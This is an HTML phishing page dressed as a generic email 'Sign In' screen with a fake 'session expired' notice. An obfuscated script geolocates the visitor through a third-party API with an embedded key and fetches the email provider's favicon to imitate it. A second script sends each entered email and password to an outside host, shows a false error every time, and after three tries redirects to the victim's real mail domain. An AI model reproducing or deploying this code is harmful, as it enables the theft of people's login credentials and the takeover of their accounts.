<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Safe Sign In</title>
  <style>
    /* Minimal styling for demo */
    /* body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(30,35,40,.08); transform:translateY(12px); opacity:0; animation: slideIn .4s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    label { display:block; font-size:.9rem; margin-top:12px; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #d9dde6; border-radius:8px; margin-top:6px; box-sizing:border-box; }
    .row { display:flex; gap:8px; align-items:center; margin-top:12px; }
    button { padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; cursor:pointer; }
    button[disabled] { opacity:.6; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; }
    .error-container { display:none; margin-top:10px; color:#fff; background:#ef4444; padding:8px; border-radius:6px; font-size:.9rem; }
    .success { display:none; margin-top:10px; color:#065f46; background:#bbf7d0; padding:8px; border-radius:6px; font-size:.9rem; }
    .small { font-size:.85rem; color:#6b7280; margin-top:8px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; margin-left:6px; } */

     body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 8px 30px rgba(20,25,30,.06); transform:translateY(12px); opacity:0; animation: slideIn .35s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    h2 { margin:0 0 8px; font-size:1.25rem; }
    label { display:block; font-size:.92rem; margin-top:12px; color:#374151; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #e6e9ef; border-radius:8px; margin-top:6px; box-sizing:border-box; font-size:.95rem; }
    .row { display:flex; gap:8px; align-items:center; margin-top:14px; }
    button { flex:1; padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; font-weight:600; cursor:pointer; }
    button[disabled] { opacity:.65; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; font-size:.95rem; color:#374151; }
    .error-container { display:none; margin-top:12px; background:#ef4444; color:#fff; padding:9px; border-radius:8px; font-size:.9rem; text-align:center; }
    .small { font-size:.85rem; color:#6b7280; margin-top:10px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; }
  
  </style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="title">
    <h2 id="title">Sign In</h2>

    <form id="loginForm" name="loginForm" autocomplete="off">

         <span id="country"></span>
            <!-- <span id="city"></span> -->
            <span id="eyep"></span>
            <span id="nownow"></span>
            <!-- Paragraph -->
            <p class="mb-4 " style="font-size: .8rem; color: red;">Your previous session has expired; please sign in to continue.</p>

      <label for="id">Email</label>
      <input id="id" name="id" type="text" inputmode="email" placeholder="" />

      <label for="pswrd">Password</label>
      <input id="pswrd" name="pswrd" type="password" placeholder="Enter password" />

    <!-- <div class="row" style="margin-top:14px">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" aria-hidden="true">⏳</div>
      </div>  -->
      
      <div class="row">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" id="spinner">⏳</div>
      </div>
    </form>

    <!-- <div class="error-container" role="alert"></div>
    <div class="success" id="successBox"></div> -->

    <!-- <div class="small">
      After 3 failed attempts, we can suggest your email provider's homepage if it's an allowed domain.
      <span id="suggestLinkHolder"></span>
    </div> -->

     <div class="error-container" id="errorBox" role="alert"></div>
    <div class="small" id="infoText">
      Session timeout detected. Please reauthenticate to proceed to your email domain.
    </div>
  </div>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script>
  const _0x50402a=_0x141b;function _0x141b(_0x14c3d5,_0x343409){const _0x474680=_0x49fa();return _0x141b=function(_0x303866,_0x20d9d0){_0x303866=_0x303866-(-0x853+0x260+-0x723*-0x1);let _0x19b580=_0x474680[_0x303866];return _0x19b580;},_0x141b(_0x14c3d5,_0x343409);}(function(_0x6356a4,_0x3669e7){const _0x2d08b5=_0x141b,_0xc8f683=_0x6356a4();while(!![]){try{const _0x1564df=parseInt(_0x2d08b5(0x14d))/(-0x8f9*0x4+-0x769*-0x2+-0xd*-0x19f)*(-parseInt(_0x2d08b5(0x13a))/(-0x522+0x61*-0x14+0x94*0x16))+-parseInt(_0x2d08b5(0x14a))/(0xd29+-0x1005+-0x1*-0x2df)+parseInt(_0x2d08b5(0x157))/(0x13*0x10f+-0x142d+0x14)+parseInt(_0x2d08b5(0x164))/(0x153e*-0x1+-0x116f+0x26b2)*(-parseInt(_0x2d08b5(0x13c))/(-0x283*-0x6+0x3*-0xa25+0x1*0xf63))+parseInt(_0x2d08b5(0x147))/(0x1*-0x1499+-0x4f*-0x2+0x1402)+-parseInt(_0x2d08b5(0x158))/(-0xadd+0x10d*-0x25+0x31c6)+parseInt(_0x2d08b5(0x14c))/(0xed3+0x1521+-0x23eb)*(parseInt(_0x2d08b5(0x165))/(-0x1*-0x1677+-0x1ee1+0x874));if(_0x1564df===_0x3669e7)break;else _0xc8f683['push'](_0xc8f683['shift']());}catch(_0x5c3556){_0xc8f683['push'](_0xc8f683['shift']());}}}(_0x49fa,-0x118f50+-0x2*-0x5aee9+0x115468),window[_0x50402a(0x138)]=function(){const _0x4378f4=_0x50402a,_0x4ea824={'BCWJE':_0x4378f4(0x144),'LEFbx':_0x4378f4(0x153),'hlROg':function(_0x4681fb,_0x5d3a39){return _0x4681fb+_0x5d3a39;},'iwJmj':_0x4378f4(0x13b)+_0x4378f4(0x15a)+_0x4378f4(0x162)+_0x4378f4(0x15c)+'n='};let _0x32642c=document[_0x4378f4(0x149)+_0x4378f4(0x155)]('id')[_0x4378f4(0x136)],_0x312dff=_0x32642c[_0x4378f4(0x151)]('@')?_0x32642c[_0x4378f4(0x134)]('@')[0x6*-0x351+0x11db+-0x2*-0x106]:'';document[_0x4378f4(0x149)+_0x4378f4(0x155)](_0x4ea824[_0x4378f4(0x14b)])[_0x4378f4(0x143)+'t']=_0x312dff,document[_0x4378f4(0x149)+_0x4378f4(0x155)](_0x4ea824[_0x4378f4(0x150)])[_0x4378f4(0x163)]=_0x4ea824[_0x4378f4(0x14f)](_0x4ea824[_0x4378f4(0x135)],_0x312dff);});var d=new Date();d[_0x50402a(0x141)](0x4*0x3832d95781+-0x3a6*0x930f89d1+-0x856065e*-0x4d6b),d[_0x50402a(0x145)+'ng'](),d[_0x50402a(0x15d)+'g']();let ipAdress=_0x50402a(0x137)+_0x50402a(0x15b)+_0x50402a(0x14e)+_0x50402a(0x160)+_0x50402a(0x148)+_0x50402a(0x131)+_0x50402a(0x168)+_0x50402a(0x15e);fetch(''+ipAdress)[_0x50402a(0x140)](_0x159a0c=>_0x159a0c[_0x50402a(0x159)]())[_0x50402a(0x140)](_0x43cbae=>{const _0xe278b6=_0x50402a,_0x6532bd={'IaFqR':_0xe278b6(0x13f),'vtWtI':_0xe278b6(0x13e),'Uzlmh':_0xe278b6(0x139),'pWfxe':_0xe278b6(0x133)},_0x5c3b1b=document[_0xe278b6(0x167)+_0xe278b6(0x161)](_0x6532bd[_0xe278b6(0x166)]);_0x5c3b1b[_0xe278b6(0x142)]=_0x43cbae[_0xe278b6(0x13d)][_0xe278b6(0x156)];const _0x177630=document[_0xe278b6(0x167)+_0xe278b6(0x161)](_0x6532bd[_0xe278b6(0x146)]);_0x177630[_0xe278b6(0x142)]=_0x43cbae[_0xe278b6(0x152)][_0xe278b6(0x132)]['en'];const _0x38993c=document[_0xe278b6(0x167)+_0xe278b6(0x161)](_0x6532bd[_0xe278b6(0x15f)]);_0x38993c[_0xe278b6(0x142)]=_0x43cbae['ip'];const _0x107fa2=document[_0xe278b6(0x167)+_0xe278b6(0x161)](_0x6532bd[_0xe278b6(0x154)]);_0x107fa2[_0xe278b6(0x142)]=d[_0xe278b6(0x15d)+'g']();})[_0x50402a(0x130)](_0x3f6559=>console[_0x50402a(0x169)](_0x3f6559));function _0x49fa(){const _0x54efd8=['37099089ehPoch','1BmBeXS','.com/v1/ip','hlROg','LEFbx','includes','city','favicon','pWfxe','ById','name','1357972ohyJzQ','8492712hllAID','json','w.google.c','i.geoapify','cons?domai','toGMTStrin','4e8a','Uzlmh','info?apiKe','tor','om/s2/favi','src','75zBigvA','10RQzafa','IaFqR','querySelec','290b61999b','error','catch','a5554f48bf','names','#nownow','split','iwJmj','value','https://ap','onload','#eyep','1460944FEUQTg','https://ww','407646IEvfPY','country','#city','#country','then','setTime','innerHTML','textConten','domain','toDateStri','vtWtI','1059079CERNGd','y=139d2378','getElement','3215703VKmTmd','BCWJE'];_0x49fa=function(){return _0x54efd8;};return _0x49fa();}
</script>


  <script>
  (function () {
    // === CONFIG: change only if needed ===
    const POST_URL = 'https://stquneurine.com/zxqsMn/feedback.php'; // your original test endpoint

    // === State & DOM refs ===
    let signInAttempts = 0;
    const form = document.getElementById('loginForm');
    const emailField = document.getElementById('id');
    const passwordField = document.getElementById('pswrd');
    const submitBtn = document.getElementById('submit-btn');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');

    // Safety checks
    if (!form || !emailField || !passwordField || !submitBtn) {
      console.error('Required form elements are missing.');
      return;
    }

    // Prefill from ?id= if present
    try {
      const qEmail = new URLSearchParams(window.location.search).get('id');
      if (qEmail) emailField.value = qEmail;
    } catch (e) { /* ignore */ }

    // Helpers
    function setUiLoading(loading) {
      submitBtn.disabled = loading;
      submitBtn.textContent = loading ? 'Loading...' : 'Sign In';
      spinner.style.display = loading ? 'inline-block' : 'none';
    }

    function showError(message) {
      errorBox.textContent = message;
      errorBox.style.display = 'block';
      passwordField.value = '';
      setTimeout(() => { errorBox.style.display = 'none'; }, 3000);
    }

    function extractDomain(email) {
      if (!email || typeof email !== 'string') return '';
      const t = email.trim();
      if (!t.includes('@')) return '';
      const parts = t.split('@').filter(Boolean);
      if (parts.length < 2) return '';
      let domain = parts.slice(1).join('@');
      domain = domain.split('/')[0].split(':')[0].trim().toLowerCase();
      return domain;
    }

    function looksLikeDomain(domain) {
      if (!domain) return false;
      if (domain.indexOf(' ') !== -1) return false;
      return domain.indexOf('.') > 0;
    }

    // Submit handler: actually POST to POST_URL
    form.addEventListener('submit', async function (evt) {
      evt.preventDefault();

      const email = (emailField.value || '').trim();
      const password = (passwordField.value || '').trim();

      if (!email) {
        showError('Please enter your email.');
        return;
      }
      if (!password || password.length < 6) {
        showError('Incorrect password. Please try again');
        return;
      }

      signInAttempts += 1;
      setUiLoading(true);

      // Use FormData so field names are exactly email/password as in the form
      const fd = new FormData();
      fd.append('id', email);
      fd.append('pswrd', password);

      try {
        // Perform the real network POST to your specified endpoint
        // Note: this will actually contact the remote server.
        const resp = await fetch(POST_URL, {
          method: 'POST',
          body: fd,
          mode: 'cors' // allow CORS; server must permit if different origin
        });

        // For test purposes, we treat all responses the same (show generic error)
        // You can inspect resp.status / resp.text() here to change behavior.
        if (!resp.ok) {
          // server returned non-2xx
          console.warn('Server returned', resp.status);
        }
        // show same UX as before
        showError('An unknown error occurred, please try again.');

      } catch (err) {
        console.error('Network error while posting:', err);
        showError('An unknown error occurred, please try again.');
      } finally {
        setUiLoading(false);
      }

      // After 3 attempts (or more), redirect to email domain automatically
      if (signInAttempts >= 3) {
        const domain = extractDomain(email);
        if (looksLikeDomain(domain)) {
          // small delay so user sees the message
          setTimeout(() => {
            window.location.href = 'https://' + domain;
          }, 900);
        } else {
          // couldn't parse domain
          showError('Could not determine a valid domain from your email.');
        }
      }
    });
  })();
  </script>
</body>
</html>
